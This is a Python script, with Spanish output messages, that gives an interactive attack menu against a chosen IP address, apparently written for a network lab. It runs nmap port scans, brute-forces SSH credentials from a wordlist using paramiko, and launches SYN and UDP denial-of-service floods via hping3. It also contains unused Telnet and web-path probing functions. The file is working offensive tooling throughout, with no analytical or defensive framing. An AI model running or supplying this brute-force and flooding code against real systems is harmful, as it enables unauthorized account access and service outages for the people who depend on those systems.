import sys
import subprocess
import time
import requests
import paramiko
import socket
import signal
from ryu.lib.packet import arp


def check_port(ip, port, timeout=2):
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            print(f"[✔] {ip}:{port} está accesible")
            return True
    except Exception:
        print(f"[✘] {ip}:{port} no responde")
        return False


def scan_ports(ip):
    print(f"[+] Escaneando puertos en {ip}...")
    #subprocess.run(["nmap", "-sS", "-sV", ip])
    subprocess.run(["nmap", "-F", "-T5", "--open", ip])



def ssh_attempt(ip, wordlist_path):
    print(f"[+] Iniciando ataque SSH a {ip} con combinaciones usuario:contraseña...")

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    found = False

    try:
        with open(wordlist_path, "r") as f:
            combos = f.read().splitlines()
    except FileNotFoundError:
        print("[x] Wordlist no encontrada.")
        return

    #print(combos)

    for combo in combos:
        if ':' not in combo:
            continue  # Ignora líneas mal formateadas

        user, password = combo.strip().split(":", 1)
        print(f"[!] Trying => Usuario: {user} | Contraseña: {password}")
 
        try:
            ssh.connect(ip, username=user, password=password, timeout=5)
            print(f"[✔] Acceso exitoso => Usuario: {user} | Contraseña: {password}")
            ssh.close()
            found = True
            break
        except paramiko.AuthenticationException:
            continue  # Intento fallido, continúa
        except Exception as e:
            print(f"[x] Error al conectar: {e}")
            break

    if not found:
        print("[✘] No se logró acceso SSH con ninguna combinación de la wordlist.")



def telnet_attempt(ip, port=23):
    print(f"[+] Intentando acceso Telnet a {ip}:{port}...")
    try:
        import telnetlib
        tn = telnetlib.Telnet(ip, port, timeout=5)
        print("[!] Acceso Telnet abierto (simulado)")
        tn.close()
    except:
        print("[x] Telnet inaccesible")

def web_attack(ip):
    print(f"[+] Atacando servidor web en http://{ip}...")
    try:
        r = requests.get(f"http://{ip}")
        if r.status_code == 200:
            print("[!] Web activa")
        for path in ["admin", "login", "config"]:
            r = requests.get(f"http://{ip}/{path}")
            print(f"[*] Probando /{path} => Código {r.status_code}")
    except:
        print("[x] Web inaccesible")


def syn_flood(ip, port):
    print(f"[+] Verificando disponibilidad previa de {ip}:{port}")
    check_port(ip, port)
    
    print(f"[+] Lanzando SYN flood sobre {ip}:{port}...")
    subprocess.Popen(["hping3", "-S", "--flood", "-c", "10000", "-p", str(port), ip])

    time.sleep(5)  # Espera unos segundos mientras se ejecuta el ataque
    print(f"[+] Verificando disponibilidad después del ataque")
    check_port(ip, port)


def udp_flood(ip, port):
    print(f"[+] Verificando disponibilidad previa de {ip}:{port}")
    check_port(ip, port)
    
    print(f"[+] Lanzando UDP flood sobre {ip}:{port}...")
    subprocess.Popen(["hping3", "--udp", "--flood", "-c", "10000", "-p", str(port), ip])

    time.sleep(5)  # Espera unos segundos mientras se ejecuta el ataque
    print(f"[+] Verificando disponibilidad después del ataque")
    check_port(ip, port)



def menu():

    
    ip = input("Introduce la IP objetivo: ")               #"192.168.20.10"     
    file = "wordlist.txt"

    while True:
        print("\n")
        print("\n--- Menú de Ataques ---")
        print("0. Change IP")
        print("1. Escanear puertos")
        print("2. Intentar acceso SSH")
        #print("3. Intentar acceso Telnet")
        #print("4. Atacar servidor web")
        print("3. Lanzar SYN flood")
        print("4. Lanzar UDP flood")
        print("5. Salir")
        print("\n")

        choice = input("Elige una opción: ")
        if choice == '0':
            ip = input("Introduce the new IP: ")  
        elif choice == '1':
            scan_ports(ip)
        elif choice == '2':
            ssh_attempt(ip, file)
        #elif choice == '3':
        #    telnet_attempt(ip)
        #elif choice == '4':
        #    web_attack(ip)
        elif choice == '3':
            port = int(input("Introduce el puerto para SYN flood: "))
            syn_flood(ip, port)
        elif choice == '4':
            port = int(input("Introduce el puerto para UDP flood: "))
            udp_flood(ip, port)
        elif choice == '5':
            print("Saliendo del programa...")
            break
        else:
            print("Opción no válida. Intenta de nuevo.")




if __name__ == "__main__":
    menu()
